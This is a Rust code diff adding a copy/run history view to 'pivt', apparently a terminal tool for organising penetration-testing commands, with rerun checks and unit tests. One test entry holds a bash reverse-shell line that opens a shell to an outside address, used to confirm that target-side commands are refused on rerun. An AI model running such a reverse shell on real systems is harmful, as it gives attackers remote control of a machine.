@@ -10,6 +10,7 @@ use crate::model::*;
 use crate::ping::{Ping, Pinger};
 use crate::room::{self, Room};
 use crate::runner::RunJob;
+use crate::history::{self, Action, Entry};
 use crate::{clipboard, netif, session, writeup};
 use fuzzy_matcher::skim::SkimMatcherV2;
 use fuzzy_matcher::FuzzyMatcher;
@@ -46,6 +47,8 @@ pub enum Mode {
     Theme,
     /// "include flags + credentials?" prompt before a writeup export.
     Export,
+    /// Per-room copy/run history (`^r` / `y`).
+    History,
 }
 
 /// Text being typed inside the HTB panel.
@@ -334,6 +337,20 @@ pub struct App {
     /// Hide commands whose tools are missing (`m`, persisted).
     pub hide_missing: bool,
 
+    // copy/run history (src/history.rs)
+    /// Loaded entries, newest first, while the history view is open.
+    pub history: Vec<Entry>,
+    pub history_idx: usize,
+    pub history_query: String,
+    /// Typing into the history filter (`/`), instead of using keys.
+    pub history_typing: bool,
+    /// Runs whose exit code still has to be appended: (job id, run id, file).
+    history_pending: Vec<(u64, String, PathBuf)>,
+    /// Tests: write history here instead of the room / config dir.
+    history_dir: Option<PathBuf>,
+    /// A job log to show in $PAGER (the event loop suspends the TUI).
+    pub pending_pager: Option<PathBuf>,
+
     matcher: SkimMatcherV2,
 }
 
@@ -533,6 +550,13 @@ impl App {
             tools: crate::tools::ToolIndex::scan(),
             tool_missing: Default::default(),
             hide_missing: cfg.hide_missing,
+            history: Vec::new(),
+            history_idx: 0,
+            history_query: String::new(),
+            history_typing: false,
+            history_pending: Vec::new(),
+            history_dir: None,
+            pending_pager: None,
             matcher: SkimMatcherV2::default(),
         };
         app.refresh_missing();
@@ -565,6 +589,7 @@ impl App {
             r.resize(rows, cols);
         }
         self.poll_cracks();
+        self.poll_history();
         self.poll_sequence();
         self.poll_htb();
         // track RHOST changes: re-point the pinger and (re)start the box timer
@@ -1023,6 +1048,7 @@ impl App {
                     );
                     msg.push_str(&format!(" · logged → {}", short_path(&path)));
                 }
+                self.record(Entry::new(Action::Copy, &key, &name, &filled));
                 self.push_recent(key);
                 self.persist_config();
                 self.set_status(msg);
@@ -1488,6 +1514,7 @@ impl App {
                         let target = self.vars.get("RHOST").cloned().unwrap_or_default();
                         writeup::log_command(self.active_room.as_ref(), &target, &title, &cmd.category, &filled, job.log.as_deref());
                     }
+                    self.record_run(&cmd_key(cmd), &title, &filled, &job);
                     self.runs.push(job);
                     spawned += 1;
                 }
@@ -1883,6 +1910,8 @@ impl App {
                     let target = self.vars.get("RHOST").cloned().unwrap_or_default();
                     writeup::log_command(self.active_room.as_ref(), &target, &title, "rerun", &cmd, new.log.as_deref());
                 }
+                let bare = cmd.strip_prefix(RAW_PTY_PREFIX).unwrap_or(&cmd).to_string();
+                self.record_run(&self.key_for_title(&title), &title, &bare, &new);
                 self.runs[self.run_tab] = new;
                 self.interacting = false;
                 self.set_status(format!("↻ re-running {title} · i to interact"));
@@ -1900,11 +1929,203 @@ impl App {
     /// Whether a run tab titled `title` ("name" or "name [n]") belongs to a
     /// target-side command.
     fn is_target_tab(&self, title: &str) -> bool {
-        let base = match title.rsplit_once(" [") {
-            Some((b, rest)) if rest.ends_with(']') => b,
-            _ => title,
-        };
+        let base = tab_base(title);
         self.commands.iter().any(|c| c.is_target() && (c.name == title || c.name == base))
+    }
+
+    /// Command key for a run tab title (best effort: the first command with
+    /// that name), else "rerun/<title>".
+    fn key_for_title(&self, title: &str) -> String {
+        let base = tab_base(title);
+        self.commands
+            .iter()
+            .find(|c| c.name == title || c.name == base)
+            .map(cmd_key)
+            .unwrap_or_else(|| format!("rerun/{title}"))
+    }
+
+    // ── history ──
+    /// Where history goes now: the active room's `.pivt/`, else the global
+    /// session dir. None when nothing may be written (tests, snapshots,
+    /// PIVT_NO_LOG).
+    fn history_file(&self) -> Option<PathBuf> {
+        if let Some(d) = &self.history_dir {
+            return Some(d.join(history::FILE));
+        }
+        (self.persist && self.logging).then(|| history::path_for(self.active_room.as_ref()))
+    }
+
+    fn record(&mut self, e: Entry) {
+        if let Some(p) = self.history_file() {
+            let _ = history::append(&p, &e);
+        }
+    }
+
+    /// Record a run that just started; its exit code follows from on_tick.
+    fn record_run(&mut self, key: &str, name: &str, filled: &str, job: &RunJob) {
+        let Some(p) = self.history_file() else { return };
+        let mut e = Entry::new(Action::Run, key, name, filled);
+        e.run = format!("{}-{}-{}", e.ts, std::process::id(), job.id);
+        e.log = job.log.clone();
+        if history::append(&p, &e).is_ok() {
+            self.history_pending.push((job.id, e.run.clone(), p));
+        }
+    }
+
+    /// Append exit records for runs that finished.
+    fn poll_history(&mut self) {
+        if self.history_pending.is_empty() {
+            return;
+        }
+        let mut done: Vec<(PathBuf, String, i32)> = Vec::new();
+        let runs = &self.runs;
+        self.history_pending.retain(|(id, run, path)| match runs.iter().find(|j| j.id == *id) {
+            None => false, // tab closed before it ended: exit unknown
+            Some(j) if j.is_running() => true,
+            Some(j) => {
+                if let Some(c) = j.exit {
+                    done.push((path.clone(), run.clone(), c));
+                }
+                false
+            }
+        });
+        for (path, run, code) in done {
+            let _ = history::append(&path, &Entry::exit_of(&run, code));
+            if let Some(e) = self.history.iter_mut().find(|e| e.run == run) {
+                e.exit = Some(code);
+            }
+        }
+    }
+
+    /// Whether run `run` was started by this pivt and hasn't exited yet.
+    pub fn history_running(&self, run: &str) -> bool {
+        self.history_pending.iter().any(|(_, r, _)| r == run)
+    }
+
+    pub fn open_history(&mut self) {
+        let path = self
+            .history_file()
+            .unwrap_or_else(|| history::path_for(self.active_room.as_ref()));
+        self.history = history::load(&path);
+        self.history_idx = 0;
+        self.history_query.clear();
+        self.history_typing = false;
+        self.mode = Mode::History;
+        if self.history.is_empty() {
+            self.set_status("no history yet for this room — copies (⏎) and runs (x) land here");
+        }
+    }
+
+    /// Indices into `history` matching the filter, newest first.
+    pub fn history_matches(&self) -> Vec<usize> {
+        if self.history_query.is_empty() {
+            return (0..self.history.len()).collect();
+        }
+        self.history
+            .iter()
+            .enumerate()
+            .filter(|(_, e)| {
+                let hay = format!("{} {} {} {}", e.name, e.key, e.action.label(), e.cmd);
+                self.matcher.fuzzy_match(&hay, &self.history_query).is_some()
+            })
+            .map(|(i, _)| i)
+            .collect()
+    }
+
+    pub fn history_selected(&self) -> Option<&Entry> {
+        self.history_matches().get(self.history_idx).map(|&i| &self.history[i])
+    }
+
+    pub fn history_next(&mut self) {
+        let n = self.history_matches().len();
+        if n > 0 {
+            self.history_idx = (self.history_idx + 1) % n;
+        }
+    }
+    pub fn history_prev(&mut self) {
+        let n = self.history_matches().len();
+        if n > 0 {
+            self.history_idx = (self.history_idx + n - 1) % n;
+        }
+    }
+    pub fn history_push(&mut self, c: char) {
+        self.history_query.push(c);
+        self.history_idx = 0;
+    }
+    pub fn history_pop(&mut self) {
+        self.history_query.pop();
+        self.history_idx = 0;
+    }
+
+    /// `⏎`: copy the entry's filled command again.
+    pub fn history_copy(&mut self) {
+        let Some(e) = self.history_selected().cloned() else { return };
+        match clipboard::copy(&e.cmd) {
+            Ok(how) => self.set_status(format!("✓ copied ({}) · {}", how.label(), e.name)),
+            Err(err) => self.set_status(format!("✗ copy failed: {err}")),
+        }
+    }
+
+    /// `x`: run the entry's filled command again in a new tab. Same checks
+    /// as `x` on a command: target-side refused, tools must be installed.
+    pub fn history_rerun(&mut self) {
+        let Some(e) = self.history_selected().cloned() else { return };
+        let cmd = self.command_for_key(&e.key).cloned();
+        let target_side = match &cmd {
+            Some(c) => c.is_target(),
+            None => self.is_target_tab(&e.name),
+        };
+        if target_side {
+            self.set_status(format!("⛔ {TARGET_SIDE_MSG}"));
+            return;
+        }
+        let unset = extract_placeholders(&e.cmd);
+        if !unset.is_empty() {
+            self.set_status(format!("⚠ that line still has <{}> — ⏎ copy it and fill it by hand", unset.join(">, <")));
+            return;
+        }
+        let tools = self.missing_tools_line(&e.cmd);
+        if !tools.is_empty() {
+            self.set_status(Self::missing_tool_msg(&tools));
+            return;
+        }
+        let cwd = self.active_room.as_ref().map(|r| r.path.clone());
+        if let Some(dir) = cwd.clone().or_else(|| std::env::current_dir().ok()) {
+            crate::runner::prepare_output_dirs(&e.cmd, &dir);
+        }
+        let line = match &cmd {
+            Some(c) => c.wrap_for_run(&e.cmd),
+            None => e.cmd.clone(),
+        };
+        let (rows, cols) = crate::runner::pane_size(self.run_fullscreen);
+        let log = self.job_log(&e.name);
+        match RunJob::spawn_logged(e.name.clone(), line, rows, cols, cwd.as_deref(), log) {
+            Ok(job) => {
+                if self.logging {
+                    let target = self.vars.get("RHOST").cloned().unwrap_or_default();
+                    writeup::log_command(self.active_room.as_ref(), &target, &e.name, "history", &e.cmd, job.log.as_deref());
+                }
+                self.record_run(&e.key, &e.name, &e.cmd, &job);
+                let first_new = self.runs.len();
+                self.runs.push(job);
+                self.mode = Mode::Normal;
+                self.show_runs_from(first_new);
+                self.set_status(format!("↻ re-running {} from history · i to interact", e.name));
+            }
+            Err(err) => self.set_status(format!("✗ spawn failed: {err}")),
+        }
+    }
+
+    /// `l`: page through the entry's job log.
+    pub fn history_open_log(&mut self) {
+        let Some(e) = self.history_selected() else { return };
+        match e.log.clone() {
+            Some(p) if p.is_file() => {
+                self.pending_pager = Some(p);
+            }
+            Some(p) => self.set_status(format!("log is gone: {}", short_path(&p))),
+            None => self.set_status("no log for this entry (copies and PIVT_NO_LOG runs have none)"),
+        }
     }
 
     // ── persistent session ──
@@ -2614,6 +2835,7 @@ impl App {
                 .filter(|(k, v)| writeup::is_secret_var(k) && !v.is_empty())
                 .map(|(_, v)| v.clone())
                 .collect(),
+            history: self.history_file().map(|p| history::load(&p)).unwrap_or_default(),
         };
         match writeup::export(self.active_room.as_ref(), &target, &domain, &lhost, &self.loot, &opts) {
             Ok(p) => {
@@ -2762,6 +2984,14 @@ fn port_keywords(port: &str) -> Vec<&'static str> {
     }
 }
 
+/// "name [2]" → "name" (the tab title of one step of a multi-step command).
+fn tab_base(title: &str) -> &str {
+    match title.rsplit_once(" [") {
+        Some((b, rest)) if rest.ends_with(']') => b,
+        _ => title,
+    }
+}
+
 fn derive_categories(commands: &[Command]) -> Vec<String> {
     let mut out: Vec<String> = Vec::new();
     for c in commands {
@@ -2864,6 +3094,60 @@ mod tests {
         let mut c = app.commands[quick].clone();
         c.requires = vec!["impacket-secretsdump".into()];
         assert_eq!(app.tools.missing(&crate::tools::required(&c)), ["impacket-secretsdump"]);
+    }
+
+    #[test]
+    fn runs_land_in_history_with_exit_codes_and_rerun_checks() {
+        let dir = std::env::temp_dir().join(format!("pivt-app-hist-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        let mut app = seq_app();
+        app.history_dir = Some(dir.clone());
+        let c = app.commands[app.command_by_key("t/c").unwrap()].clone();
+        assert_eq!(app.spawn_cmd(&c), 1);
+        settle(&mut app, 1);
+        app.poll_history();
+        assert!(app.history_pending.is_empty(), "exit recorded");
+        let got = history::load(&dir.join(history::FILE));
+        assert_eq!(got.len(), 1);
+        assert_eq!((got[0].action, got[0].key.as_str(), got[0].cmd.as_str(), got[0].exit), (Action::Run, "t/c", "true", Some(0)));
+
+        // re-run from the history view: new tab + new entry, newest first
+        app.open_history();
+        assert!(app.mode == Mode::History);
+        app.history_rerun();
+        assert_eq!(app.runs.len(), 2, "status {:?}", app.status);
+        settle(&mut app, 2);
+        app.poll_history();
+        let got = history::load(&dir.join(history::FILE));
+        assert_eq!(got.len(), 2);
+        assert!(got[0].ts >= got[1].ts && got.iter().all(|e| e.exit == Some(0)));
+
+        // a target-side entry is refused, so is one whose tool is missing
+        app.history = vec![Entry::new(Action::Copy, "shells/bash tcp", "bash tcp", "bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'")];
+        app.history_idx = 0;
+        app.history_rerun();
+        assert!(app.status.contains(TARGET_SIDE_MSG), "{:?}", app.status);
+        app.tools = crate::tools::ToolIndex::from_names(&[]);
+        app.history = vec![Entry::new(Action::Run, "web/cewl wordlist", "cewl wordlist", "cewl http://x -w words.txt")];
+        app.history_rerun();
+        assert!(app.status.contains("`cewl` not found on PATH"), "{:?}", app.status);
+        app.history = vec![Entry::new(Action::Copy, "x/y", "y", "nmap <RHOST>")];
+        app.history_rerun();
+        assert!(app.status.contains("<RHOST>"), "{:?}", app.status);
+        assert_eq!(app.runs.len(), 2, "nothing else spawned");
+        // filter
+        app.history = history::load(&dir.join(history::FILE));
+        app.history_query = "zzzz".into();
+        assert!(app.history_matches().is_empty());
+        app.history_query = "true".into();
+        assert_eq!(app.history_matches().len(), 2);
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn test_apps_never_write_history() {
+        let app = App::for_tests();
+        assert!(app.history_file().is_none());
     }
 
     #[test]
